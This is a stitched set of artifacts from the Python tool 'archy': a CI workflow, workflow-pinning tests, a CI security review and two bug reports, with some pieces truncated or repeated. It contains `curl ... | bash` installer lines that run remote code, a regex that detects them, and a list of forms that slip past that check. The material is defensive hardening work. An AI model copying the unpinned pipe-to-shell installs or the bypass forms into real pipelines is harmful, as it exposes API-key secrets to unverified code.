**Still open:** `install-e2e.yml` line 49 runs an unpinned `npm install -g @anthropic-ai/claude-code`, and line 55 runs `curl -fsS https://cursor.com/install | bash` with no checksum, in a workflow that holds API-key secrets (tag and dispatch only).

So the headline problem in the title is done and only that last bullet remains. Leaving this open for it; it could be retitled.

name: Installer E2E (gated)

# Layer 5 of docs/SPEC_INSTALL_TESTING.md: install the real client CLI, run
# `archy install` against it, and confirm the client actually reaches archy.
#
# Gated, not scheduled: it runs on release tags (so we know the install path
# works for the version we are about to publish) and on manual dispatch. No
# cron, by design (see the spec's "Why E2E is gated"). It is excluded from PRs
# because it costs API tokens and needs the client API-key secrets.
on:
  push:
    tags: ["v*"]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  e2e:
    name: ${{ matrix.client }} on ${{ matrix.os }}
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        client: [claude-code, cursor]
        exclude:
          # The official Cursor Agent CLI ships for Linux and macOS only; on
          # Windows it runs through WSL or a community build, neither of which
          # is scriptable here. Cursor is still covered on ubuntu + macos.
          - os: windows-latest
            client: cursor
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      - name: Install uv
        uses: astral-sh/setup-uv@1db35dd8eee11c5894872e0b383ae6c406cf738d # v10.4.0
        with:
          enable-cache: true

      - name: Set up Python
        run: uv python install 3.10

      - name: Install archy
        run: uv sync

      - name: Install Claude Code CLI
        if: matrix.client == 'claude-code'
        run: npm install -g @anthropic-ai/claude-code

      - name: Install Cursor CLI
        # Cursor is Unix-only in this matrix (the windows-latest x cursor cell
        # is excluded above), so a single bash install step covers it.
        if: matrix.client == 'cursor'
        run: curl -fsS https://cursor.com/install | bash

      - name: Run archy install
        run: uv run archy install --target ${{ matrix.client == 'claude-code' && 'claude' || 'cursor' }} --yes

      - name: Assert the written config parses and names archy
        # Always-on assertion: no API key needed. Confirms the install path
        # produced a config the client could load.
        run: uv run python tests/install/e2e_assert_config.py ${{ matrix.client == 'claude-code' && 'claude' || 'cursor' }}

      - name: Headless reachability (Claude Code)
        if: matrix.client == 'claude-code' && env.ANTHROPIC_API_KEY != ''
        run: |
          claude -p "Call the archy_score tool on the current directory and print only the overall number." \
            --allowedTools "mcp__archy__archy_score" 2>&1 | tee out.txt
          grep -qiE "archy|overall|[0-9]" out.txt
        env:
          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}

      - name: Headless reachability (Cursor)
        if: matrix.client == 'cursor' && env.CURSOR_API_KEY != ''
        run: |
          cursor-agent -p "Call the archy_score tool on the current directory and print the overall number." 2>&1 | tee out.txt
          grep -qiE "archy|overall|[0-9]" out.txt
        env:
          CURSOR_API_KEY: ${{ secrets.CURSOR_API_KEY }}

    env:
      ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
      CURSOR_API_KEY: ${{ secrets.CURSOR_API_KEY }}
"""`action.yml` must treat its inputs as data, never as shell source (#607).

GitHub expands `${{ inputs.* }}` before bash parses a `run:` script, so an input
interpolated there is command execution for whoever controls the value. The
steps are exercised for real: the script is lifted out of the YAML and run under
bash with a fake `archy` on PATH that records its argv.
"""

from __future__ import annotations

import re
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

pytestmark = pytest.mark.skipif(
    sys.platform == "win32", reason="runs the action's bash scripts under a POSIX shell"
)

ROOT = Path(__file__).resolve().parents[1]
ACTION = yaml.safe_load((ROOT / "action.yml").read_text())
STEPS = {step["name"]: step for step in ACTION["runs"]["steps"]}
RUN_STEP = next(s for n, s in STEPS.items() if n.startswith("Run archy"))
PYTHON_STEP = STEPS["Set up Python"]

# Every input the run step reads, with the defaults the action declares.
DEFAULTS = {
    "INPUT_COMMAND": "score",
    "INPUT_PATH": ".",
    "INPUT_STRICT": "true",
    "INPUT_STRICT_TOLERANCE": "0.02",
    "INPUT_RECORD": "false",
    "INPUT_CONFIG": "",
    "INPUT_BASELINE": "archy-baseline.json",
    "INPUT_HISTORY_BRANCH": "archy-history",
    "INPUT_HISTORY_LAST": "10",
    "INPUT_PYTHON_VERSION": "3.12",

"""The gated E2E job installs vendor CLIs next to API keys, so both are fenced (#607)."""

from __future__ import annotations

import re
from pathlib import Path

import yaml

WORKFLOWS = Path(__file__).resolve().parents[1] / ".github" / "workflows"
E2E = yaml.safe_load((WORKFLOWS / "install-e2e.yml").read_text(encoding="utf-8"))
JOB = E2E["jobs"]["e2e"]


def _runs() -> list[str]:
    return [
        step["run"]
        for path in sorted(WORKFLOWS.glob("*.yml"))
        for job in yaml.safe_load(path.read_text(encoding="utf-8"))["jobs"].values()
        for step in job.get("steps", [])
        if "run" in step
    ]


def test_no_workflow_pipes_a_download_into_a_shell():
    piped = re.compile(r"\b(curl|wget)\b[^\n|]*\|\s*(sudo\s+)?(ba|z)?sh\b")

    assert [run for run in _runs() if piped.search(run)] == []


def test_global_npm_installs_name_an_exact_version():
    installs = [
        package
        for run in _runs()
        for args in re.findall(r"npm install -g (.+)", run)
        for package in args.split()
    ]

    assert installs, "fixture drifted: no global npm install left to check"
    assert [p for p in installs if not re.search(r".@\d+\.\d+\.\d+$", p)] == []

## Findings, ranked

**1. The pinned `cursor-agent` updates itself, and runs the new version, in the step that holds `CURSOR_API_KEY`** (`.github/workflows/install-e2e.yml`, "Headless reachability (Cursor)"). I read this in the pinned linux-x64 tarball and did not execute it.
- `7000.index.js`, before the print/headless branch: `s.disableAutoUpdate||"static"===ts.channel||setTimeout((()=>{(0,L.NB)({... isAutoUpdate:!0 ...})}),2e3).unref()`
- `2141.index.js`: when a newer release exists, it downloads it and repoints `~/.local/bin/{agent,cursor-agent}`. The expected checksum comes from the update server (`packageDigests`) and is optional in the code, not from your pin.
- It then runs `spawn(<new version>/cursor-agent, ["cleanup-install-versions", ...], {detached:!0, stdio:"ignore"})`. No `env` is passed, so the new code inherits `CURSOR_API_KEY`.
- This applies once Cursor ships a newer release and the `-p` call lives longer than 2s. I did not check that the update server accepts an API-key login.
- Fix: pass the hidden flag, `cursor-agent --disable-auto-update -p ...`, and assert it in the test. The flag is defined in `index.js`.

**2. `tests/test_workflow_pins.py` passes while the property is violated.** I mutated scratch copies of the workflows. The unmodified copy passed, and the controls (unpinned `npm install -g`, an added `curl | bash` step) failed as they should. All of these still passed:
- **Checksum:** replacing the `shasum -c` line with `true`. Nothing tests the main new protection.
- **npm spellings, added beside the pinned install:** `npm i -g x`, `npm install --global x`, `npm install x -g`.
- **Remote shell, as an extra step:**
  - `bash <(curl ...)` and `bash -c "$(curl ...)"`
  - `curl ... | env bash` and `| /bin/bash`
  - `curl ... | tee i | bash`
  - `curl -o i ...; bash i`
  - `iwr ... | iex`
  - a `\` line continuation before `| bash`
- **Keys:**
  - `secrets['ANTHROPIC_API_KEY']` at workflow level or in an install step's `env`
  - `${{ secrets.X }}` inside a `run:` or a `uses` step's `with:`
  - a job env value of `${{ secrets.CURSOR_API_KEY }}-${{ 'a' != '' }}`, which satisfies the `endswith` check
  - a second job holding the key
  - an `npm install` moved into the key-holding step
- **Other:**
  - a `.yaml` workflow file is never scanned
  - reverting a step `if` to `env.ANTHROPIC_API_KEY != ''` passes, and that would silently skip the reachability check forever

- Search the whole serialized step and workflow for `secrets\b`, not just `env` for `secrets.`.
- Require the exact job env expressions.
- Assert the `if` conditions, the `shasum -c` line before `tar`, and `--disable-auto-update`.

**3. Smaller, inferred rather than verified: unpinned code can still run under the client's key.** `archy install` wires the MCP server as `uvx archy mcp` (`src/archy/install/base.py:38-39`). During the headless step the client would resolve archy and its dependencies unpinned from PyPI. That is a problem if the client passes its environment to MCP servers, which I did not check. ## Pre-existing, worth a separate ticket
- **Windows:** the Claude headless step has no `shell: bash`, so pwsh gets bash `\` continuations. I expect a parse error once the Anthropic secret exists. The lines are unchanged from `main`.
- **False passes:** that step and the Cursor one use `| tee` under the default shell (no `pipefail` on Linux and macOS), and `grep "[0-9]"` would match most error messages.
- **zizmor:** `setup-uv` `enable-cache: true` in a job that uses secrets (cache poisoning, high), and `checkout` without `persist-credentials: false`.

## Checked and found fine
- **GitHub semantics:** job `env` built from `secrets.X != ''` and the step `if` comparing to `'true'` are valid.
- **Cursor install:**
  - Both SHA256 values match fresh downloads.
  - The tarball's top directory is `dist-package/`, so `--strip-components=1` is right.
  - The launcher resolves the symlink, and the layout matches the official installer. The only difference in links is that the `agent` alias is not created, and the workflow does not use it.
  - I ran the install step on darwin/arm64 with a fake `HOME`: exit 0, checksum OK, link and `GITHUB_PATH` correct. I did not run it on Linux, and no vendor code was executed.
- **Claude pin:** `@anthropic-ai/claude-code@2.1.323` exists, was published 2026-11-12, and pins its platform packages exactly. It declares Node >=22; I did not check the runners' Node or npm versions.

Exit code 1
## Problem

The Claude Code plugin starts the MCP server through `plugins/claude/bin/archy-mcp.mjs`, which tries in order: an `archy` on PATH, `uvx archy... mcp`, then `python -m archy mcp` (:64-75; header comment step 3 at :14). If none can be spawned it prints FAIL_MESSAGE, an actionable install hint (:91). The plugin README (:5, :59) promises exactly this.

Two defects combine:

1. **`python -m archy mcp` can never work.** archy has no `src/archy/__main__.py`, so Python answers "No module named archy.__main__; 'archy' is a package and cannot be directly executed" even when archy IS installed.
2. **The install hint is unreachable whenever any `python3` / `python` is on PATH.** The shim falls through to the next candidate only on a spawn `error` (:139-147). Its `exit` handler (:149-151) forwards the child's exit code. The python candidate always spawns successfully, so the shim exits 1 with Python's message and never prints FAIL_MESSAGE.

Every macOS has a `python3` (the Xcode stub) and nearly every Linux does, so a user with neither archy nor uv gets "No module named archy" in the MCP log instead of the install hint. That is the common no-uv case #150 set out to fix, not an edge case. `tests/test_plugin.py:150` / :221 assert the fallback string is present, never that it runs.

## Reproduction

```bash
# 1. the module form fails even with archy installed
V=$(mktemp -d)/v && uv venv -q "$V" --python 3.12 && uv pip install -q --python "$V/bin/python" archy
"$V/bin/python" -m archy mcp </dev/null; echo "rc=$?"

# 2. with only a python3 on PATH (no archy, no uvx), the hint never prints
S=$(mktemp -d) && ln -s "$(command -v python3)" "$S/python3"
NODE=$(command -v node)
PATH="$S" "$NODE" plugins/claude/bin/archy-mcp.mjs </dev/null; echo "rc=$?"
PATH=/nonexistent "$NODE" plugins/claude/bin/archy-mcp.mjs </dev/null; echo "rc=$?"
```

Actual:

```
.../bin/python: No module named archy.__main__; 'archy' is a package and cannot be directly executed
rc=1
/Applications/Xcode.app/Contents/Developer/usr/bin/python3: No module named archy
rc=1
archy MCP server could not start: none of `archy`, `uvx`, or `python` were found on PATH.
Install any one of these, then restart Claude Code:
  - uv (bootstraps its own Python): curl -LsSf https://astral.sh/uv/install.sh | sh
  ...
rc=1
```

## Expected

From the shim's own header comment and the plugin README: when archy is pip-installed but its console script is off PATH, `python -m archy mcp` starts the server; when archy is not installed at all, the user sees FAIL_MESSAGE, whether or not a Python interpreter exists.

## Suggested fix

- Add `src/archy/__main__.py` that calls the CLI entry point, so `python -m archy mcp` (and `python -m archy --help`) work.
- In the shim, treat the python candidate as available only if archy is importable: probe with `python -c "import archy"` (spawnSync, short timeout) before adding it to `candidates()`, or treat a fast non-zero exit of that candidate before any stdout as "not available" and fall through to FAIL_MESSAGE.

## Test

- A test that actually runs `sys.executable -m archy --help` in a subprocess and asserts exit 0 and the usage text (today it would fail with the `__main__` error).
- A shim test with a temp PATH holding only a `python3` that cannot import archy (a stub script that exits 1 is enough on CI; assert first that `python3 -c "import archy"` fails on that PATH so the fixture reaches the branch), asserting stderr contains FAIL_MESSAGE's first line. Mutation check: remove the probe, confirm the test goes red.

## Notes

- Related: #150 / #668 (closed; introduced and versioned the shim). A separate `python -m archy.cli` crash is a different entry point.
- Severity: medium (the actionable hint the plugin promises is unreachable on most machines, and the documented fallback never works).
- Found by the 2026-11-04 codebase audit, verified by an independent reproduction. Cited lines are on `main` at ee431ef.

content.content:
## Problem

`archy conventions --module` (and `archy_module_view` on MCP) reads `__all__` only from a plain `__all__ = [...]` (or annotated) assignment of string literals (`src/archy/conventions.py:586-591`, `_string_literals` at :621). Every other way of building `__all__` is dropped without a trace:

- `__all__ += [...]` and `__all__.extend([...])` are ignored, so only the first literal is reported;
- `__all__ = [*sub.__all__, "Y"]` keeps only `"Y"`;
- `__all__ = ["X"] + sub.__all__` (a BinOp, or any IfExp / Call right-hand side) yields `frozenset()`, which the view renders as "exports nothing". The `_ModuleFacts` comment at :522 explicitly distinguishes that from `None` ("no `__all__`"), so the value should be *unknown*, not empty.

The view still prints "every list above is COMPLETE for this module; absence is an answer" (`src/archy/cli_render.py:1362`) and `census_complete: true`, because `census_complete` is computed only from unparsed modules (:1760), never from whether `exports` could be read. The `ModuleView` docstring (:405-421), README:487, SKILL.md:204 and the tool description (`src/archy/mcp.py:902`) all promise that every list is COMPLETE when `census_complete` is true.

The same partial set feeds `export_gaps` (:1197), which then tells the agent to add members that are already exported.

`__all__ += sub.__all__` is the numpy / scipy idiom, so this is not exotic. Who it hurts: an agent asks "is `B` part of `pkg`'s public API?" and the one tool that exists to be trusted in the negative says no, with an explicit COMPLETE marker.

## Reproduction

```bash
P=$(mktemp -d)/exports && mkdir -p "$P/pkg" && cd "$P"
cat > pkg/__init__.py <<'EOF'
__all__ = ["A"]
__all__ += ["B"]
A = B = 1
EOF
cat > pkg/ext.py <<'EOF'
__all__ = ["P"]
__all__.extend(["Q"])
P = Q = 1
EOF
cat > pkg/star.py <<'EOF'
from . import ext
__all__ = [*ext.__all__, "Y"]
from .ext import P, Q
Y = 1
EOF
cat > pkg/extra.py <<'EOF'
from . import ext
__all__ = ["X"] + ext.__all__
from .ext import P, Q
X = 1
EOF

python3 -B -c "import sys, importlib; sys.path.insert(0, '.')
for m in ['pkg', 'pkg.ext', 'pkg.star', 'pkg.extra']: print(m, importlib.import_module(m).__all__)"
for m in pkg pkg.ext pkg.star pkg.extra; do archy conventions . --module $m | grep -E 'exports|COMPLETE'; done
```

Actual:

```
pkg ['A', 'B']
pkg.ext ['P', 'Q']
pkg.star ['P', 'Q', 'Y']
pkg.extra ['X', 'P', 'Q']
  exports       A
  🔴 every list above is COMPLETE for this module; absence is an answer
  exports       P
  🔴 every list above is COMPLETE for this module; absence is an answer
  exports       Y
  🔴 every list above is COMPLETE for this module; absence is an answer
  exports       (none)
  🔴 every list above is COMPLETE for this module; absence is an answer
```

`--format json` gives `exports: ["A"], census_complete: true`; the MCP payload shares the model.

`export_gaps` inventing missing members:

```bash
P=$(mktemp -d)/gaps && mkdir -p "$P/pkg" && cd "$P"
cat > pkg/models.py <<'EOF'
class Base: pass
class A(Base): pass
class B(Base): pass
class C(Base): pass
class D(Base): pass
EOF
cat > pkg/__init__.py <<'EOF'
from .models import Base, A, B, C, D
__all__ = ["Base", "A", "B"]
__all__ += ["C", "D"]
EOF
archy conventions . | grep -A1 'export gaps'
```

```
## export gaps (1) - defined but not re-exported beside their siblings
  pkg                          Base: 3/5  missing C, D
```

## Expected

The runtime `__all__` printed by CPython above is the ground truth. For each module, archy must either report that exact set, or say the set is not statically known and not claim COMPLETE for `exports`. A non-literal right-hand side must never read as "exports nothing". In the second fixture, `pkg` exports all five family members, so `export_gaps` must be empty.

## Suggested fix

- Fold the statically readable forms into the set: `__all__ += [literals]`, `__all__.extend([literals])`, `__all__.append("x")`, and literal elements of a `[*..., "x"]` / `[...] + [...]` expression when every operand is a literal list.
- Anything else (a starred or added non-literal operand, IfExp, Call, augmented assignment of a name) marks `exports` as unknown: an explicit state on `ModuleView` (for example `exports_complete: false`, or a reason string) on CLI text, CLI JSON and MCP, with the COMPLETE marker qualified for that field. Do not reuse `None`, which already means "no `__all__`".
- `_export_gaps` skips a module whose `__all__` is not fully known.

## Test

- Fixture: the five shapes above (`+=`, `.extend`, starred, BinOp with a non-literal operand, plus a plain literal control). Assert first that each module's source contains the mutation form (so the fixture reaches the new branch), then assert on `compute_module_view(...).model_dump()`: `pkg` exports `{"A","B"}`, `pkg.ext` exports `{"P","Q"}`, `pkg.extra` is reported unknown (not empty, not `None`). Expected values are the CPython `__all__` values, worked out above, not archy's output.
- `export_gaps` on the second fixture is `[]`.
- Assert the text output for `pkg.extra` does not print the unqualified COMPLETE marker for `exports`.
- Mutation check: remove the `AugAssign` branch, clear `__pycache__`, confirm red.

## Notes

- Related, not duplicates: #666 (closed; COMPLETE claim when modules fail to parse, this is a parsed module), #476 (open; dynamic-import blind spots, imports rather than `__all__`).
- Severity: high (a negative answer under an explicit COMPLETE marker is wrong, and `export_gaps` prescribes a wrong edit).
- Found by the 2026-11-04 codebase audit, verified by an independent reproduction. Cited lines are on `main` at ee431ef.

#1021 nightlab-agent test(install): skip the setgid staging test where new folders do not inherit the bit
#1019 hslee16 fix(plugin): make the shim's Python fallback work and keep the install hint reachable (#766)
#1017 hslee16 ci(install-e2e): pin both vendor installers and keep API keys off install steps (#607)
#1015 hslee16 fix(index): re-parse cache rows written by another archy or tree-sitter version (#740)

```bash
__all__ += ["B"]
A = B = 1
EOF
cat > pkg/ext.py <<'EOF'
__all__ = ["P"]
__all__.extend(["Q"])
P = Q = 1
EOF
cat > pkg/star.py <<'EOF'
from . import ext
__all__ = [*ext.__all__, "Y"]
from .ext import P, Q
Y = 1
EOF
cat > pkg/extra.py <<'EOF'
from . import ext
__all__ = ["X"] + ext.__all__
from .ext import P, Q
X = 1
EOF

python3 -B -c "import sys, importlib; sys.path.insert(0, '.')
for m in ['pkg', 'pkg.ext', 'pkg.star', 'pkg.extra']: print(m, importlib.import_module(m).__all__)"
for m in pkg pkg.ext pkg.star pkg.extra; do archy conventions . --module $m | grep -E 'exports|COMPLETE'; done
```

Actual:

```
pkg ['A', 'B']
pkg.ext ['P', 'Q']
pkg.star ['P', 'Q', 'Y']
pkg.extra ['X', 'P', 'Q']
  exports       A
  🔴 every list above is COMPLETE for this module; absence is an answer
  exports       P
  🔴 every list above is COMPLETE for this module; absence is an answer
  exports       Y
  🔴 every list above is COMPLETE for this module; absence is an answer
  exports       (none)
  🔴 every list above is COMPLETE for this module; absence is an answer
```

`--format json` gives `exports: ["A"], census_complete: true`; the MCP payload shares the model.

`export_gaps` inventing missing members:

```bash
P=$(mktemp -d)/gaps && mkdir -p "$P/pkg" && cd "$P"
cat > pkg/models.py <<'EOF'
class Base: pass
class A(Base): pass
class B(Base): pass
class C(Base): pass
class D(Base): pass
EOF
cat > pkg/__init__.py <<'EOF'
from .models import Base, A, B, C, D
__all__ = ["Base", "A", "B"]
__all__ += ["C", "D"]
EOF
archy conventions . | grep -A1 'export gaps'
```

```
## export gaps (1) - defined but not re-exported beside their siblings
  pkg                          Base: 3/5  missing C, D
```

## Expected

The runtime `__all__` printed by CPython above is the ground truth. For each module, archy must either report that exact set, or say the set is not statically known and not claim COMPLETE for `exports`. A non-literal right-hand side must never read as "exports nothing". In the second fixture, `pkg` exports all five family members, so `export_gaps` must be empty.

## Suggested fix

- Fold the statically readable forms into the set: `__all__ += [literals]`, `__all__.extend([literals])`, `__all__.append("x")`, and literal elements of a `[*..., "x"]` / `[...] + [...]` expression when every operand is a literal list.
- Anything else (a starred or added non-literal operand, IfExp, Call, augmented assignment of a name) marks `exports` as unknown: an explicit state on `ModuleView` (for example `exports_complete: false`, or a reason string) on CLI text, CLI JSON and MCP, with the COMPLETE marker qualified for that field. Do not reuse `None`, which already means "no `__all__`".
- `_export_gaps` skips a module whose `__all__` is not fully known.

## Test

- Fixture: the five shapes above (`+=`, `.extend`, starred, BinOp with a non-literal operand, plus a plain literal control). Assert first that each module's source contains the mutation form (so the fixture reaches the new branch), then assert on `compute_module_view(...).model_dump()`: `pkg` exports `{"A","B"}`, `pkg.ext` exports `{"P","Q"}`, `pkg.extra` is reported unknown (not empty, not `None`). Expected values are the CPython `__all__` values, worked out above, not archy's output.
- `export_gaps` on the second fixture is `[]`.
- Assert the text output for `pkg.extra` does not print the unqualified COMPLETE marker for `exports`.
- Mutation check: remove the `AugAssign` branch, clear `__pycache__`, confirm red.

## Notes

- Related, not duplicates: #666 (closed; COMPLETE claim when modules fail to parse, this is a parsed module), #476 (open; dynamic-import blind spots, imports rather than `__all__`).
- Severity: high (a negative answer under an explicit COMPLETE marker is wrong, and `export_gaps` prescribes a wrong edit).
- Found by the 2026-11-04 codebase audit, verified by an independent reproduction. Cited lines are on `main` at ee431ef.

def _dotted(node: ast.expr) -> str:
    """Render `a.b.c` / `a` from an expression, or "" for anything else."""
    if isinstance(node, ast.Name):
        return node.id
    if isinstance(node, ast.Attribute):
        prefix = _dotted(node.value)
        return f"{prefix}.{node.attr}" if prefix else node.attr
    return ""


class _ModuleFacts:
    """Everything one parsed module contributes, collected in a single pass."""

    def __init__(self, qualname: str) -> None:
        self.qualname = qualname
        self.classes: list[ast.ClassDef] = []
        self.functions: list[ast.FunctionDef | ast.AsyncFunctionDef] = []
        # Module-level assignments only, not `ast.walk`: a registry is a
        # top-level declaration, and a same-shaped call inside a function
        # body is a local variable that means nothing about house style.
        self.body_assignments: list[ast.Assign | ast.AnnAssign] = []
        # None means the module declares no `__all__` at all, which is a
        # different fact from declaring an empty one.
        self.exports: frozenset[str] | None = None
        # Names this module pulls in by `from ... import X`. Kept unfiltered;
        # `_surface_families` decides which of them this project defines.
        # (source module, name). The module is "" for a relative import, which
        # is not resolved here: a name that is unambiguous project-wide does not
        # need it, and one that is not must not be guessed at. See
        # `_surface_families`.
        self.internal_imports: set[tuple[str, str]] = set()
        # The MODULES this one imports, dotted and absolute, with relative form
        # resolved. Deliberately separate from `internal_imports` above, which
        # holds SYMBOLS and leaves `from . import x` unresolved on purpose:
        # "does `risk` import `hotspots`" is a question about modules, and
        # answering it from symbols alone would miss both `import pkg.mod` and
        # every relative import in the project.
        self.imported_modules: set[str] = set()
        # One entry per `from X import ...`: the resolved base and the (name,
        # local-name) pairs. Kept unresolved because whether a name is a
        # submodule, a re-export or a plain symbol depends on the project's
        # module set; see `_resolved_imports`.
        self.import_froms: list[tuple[str, tuple[tuple[str, str], ...]]] = []
        # Whether this module is a package's `__init__.py`. Only those can
        # re-export, so only those contribute to the re-export map.
        self.is_package = False


def _collect(tree: ast.Module, qualname: str, *, is_package: bool = False) -> _ModuleFacts:
    facts = _ModuleFacts(qualname)
    facts.is_package = is_package
    _collect_definitions(tree, facts)
    _collect_imports(tree, facts, qualname, is_package)
    _collect_assignments(tree, facts)
    if facts.exports is None:
        reexports = _redundant_alias_reexports(tree)
        if reexports:
            facts.exports = frozenset(reexports)
    return facts


def _collect_definitions(tree: ast.Module, facts: _ModuleFacts) -> None:
    for node in ast.walk(tree):
        if isinstance(node, ast.ClassDef):
            facts.classes.append(node)
        elif isinstance(node, ast.FunctionDef | ast.AsyncFunctionDef):
            facts.functions.append(node)


def _collect_imports(
    tree: ast.Module, facts: _ModuleFacts, qualname: str, is_package: bool
) -> None:
    # The package a relative import is relative to. For a package's own
    # `__init__.py` that is the qualname itself, because Python sets
    # `__package__ == __name__` there; stripping a level as if it were a plain
    # submodule resolves `from . import x` one level too shallow, and the bogus
    # name is then filtered out as unknown -- a silent false negative in the

    pkg = qualname if is_package else (qualname.rsplit(".", 1)[0] if "." in qualname else "")

def _module_view_to_text(view: ModuleView) -> str:
    """Terse and COMPLETE. Every list is the whole list; see ModuleView."""
    lines = [f"# {view.module}", f"  status        {view.status}"]
    # Classes and functions separately, each with a count. Completeness is the
    # point of this view, so nothing is dropped -- but a test module defines a
    # hundred `test_*` functions, and one undifferentiated wall is the same
    # delivery failure in a new place. A count lets a reader see the shape
    # before deciding to read the list.
    for label, items in (
        ("classes", view.classes),
        ("functions", view.functions),
        ("imports", view.imports_internal),
        ("imported by", view.imported_by),
        ("exports", view.exports if view.exports is not None else ()),
        ("name families", view.suffix_families),
    ):
        if label == "exports" and view.exports is None:
            lines.append(f"  {label:<13} (no __all__ and no explicit re-exports)")
            continue
        # "(none)" is a real answer here and must not be silence: it is what
        # makes "does this import that" answerable in the negative.
        count = f" ({len(items)})" if len(items) > 6 else ""
        lines.append(f"  {label + count:<13} {', '.join(items) if items else '(none)'}")
    if view.gates:
        lines.append("  exits")
        lines += [_gate_row(g) for g in view.gates]
    if view.census_complete:
        lines.append("  🔴 every list above is COMPLETE for this module; absence is an answer")
    else:
        skipped = view.unparsed_modules
        detail = (
            "; ".join(f"{u.module} ({u.path}): {u.reason} [Python {u.python}]" for u in skipped)
            or "(unparsed modules not listed)"
        )
        lines.append(
            "  ⚠ lists may be INCOMPLETE: "
            f"{len(skipped)} module(s) could not be parsed and were skipped: "
            f"{detail}"
        )
    return "\n".join(lines)

## MCP server (`archy mcp`)

The server is backed by a persistent parse cache (`.archy/index.db`): each tool call re-parses only the files whose content changed since the last call, so warm graph builds stay in the low seconds even on very large repos (benchmarked: 21.5s cold to 2.5s warm on Home Assistant's 17,299 modules). The cache is transparent and disposable; deleting `.archy/index.db` only costs one cold rebuild. The graph is always re-derived from the current files, so a cached result is never stale. `archy index sync` warms it explicitly; `archy index clear` removes it.

import ast
import json
from pathlib import Path

import pytest
from click.testing import CliRunner

from archy.conventions import compute_conventions, compute_module_view
from archy.conventions_exports import read_exports

# source, members, whether they were all readable
CASES = {
    "plain": ('__all__ = ["A"]', {"A"}, True),
    "augmented": ('__all__ = ["A"]\n__all__ += ["B"]', {"A", "B"}, True),
    "extend": ('__all__ = ["P"]\n__all__.extend(["Q"])', {"P", "Q"}, True),
    "append_insert_free": ('__all__ = []\n__all__.append("Q")', {"Q"}, True),
    "remove": ('__all__ = ["A", "B"]\n__all__.remove("B")', {"A"}, True),
    "sorted": ('__all__ = ["B", "A"]\n__all__ = sorted(__all__)\n__all__.sort()', {"A", "B"}, True),
    "literal_concat": ('__all__ = ["A"] + ["B"]', {"A", "B"}, True),
    "literal_unpack": ('__all__ = [*["A"], "B"]', {"A", "B"}, True),
    "self_concat": ('__all__ = ["A"]\n__all__ = __all__ + ["B"]', {"A", "B"}, True),
    "annotated_only": ('__all__: list[str]\n__all__ = ["A"]', {"A"}, True),
    "reassigned": ('__all__ = other()\n__all__ = ["A"]', {"A"}, True),
    "starred_name": ('__all__ = [*sub.__all__, "Y"]', {"Y"}, False),
    "concat_attribute": ('__all__ = ["X"] + sub.__all__', {"X"}, False),
    "augmented_name": ('__all__ = ["X"]\n__all__ += sub.__all__', {"X"}, False),
    "call": ("__all__ = build()", set(), False),
    "conditional_value": ('__all__ = ["A"] if flag else []', set(), False),
    "conditional_block": ('__all__ = ["A"]\nif flag:\n    __all__ += ["B"]', {"A"}, False),
    "only_in_blocks": ('if flag:\n    __all__ = ["A"]', set(), False),
    "decorator": (
        '__all__ = ["A"]\ndef export(f):\n    __all__.append(f.__name__)\n    return f',
        {"A"},
        False,
    ),
    "item_assignment": ('__all__ = ["A"]\n__all__[0] = name', {"A"}, False),
    "imported": ('from sub import __all__\n__all__ += ["A"]', {"A"}, False),
}


@pytest.mark.parametrize(("source", "names", "complete"), CASES.values(), ids=CASES)
def test_read_exports(source: str, names: set[str], complete: bool):
    declared = read_exports(ast.parse(source))

@pytest.mark.parametrize(

def test_reading_or_declaring_a_type_is_not_a_declaration(source: str):

def _project(root: Path, files: dict[str, str]) -> Path:
    for name, body in files.items():
        path = root / "pkg" / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body, encoding="utf-8")

def test_module_view_says_when_exports_is_partial(tmp_path: Path):
    root = _project(

            "__init__.py": '__all__ = ["A"]\n__all__ += ["B"]\nA = B = 1\n',
            "extra.py": 'from . import ext\n__all__ = ["X"] + ext.__all__\nX = 1\n',
            "dynamic.py": "__all__ = build()\n",
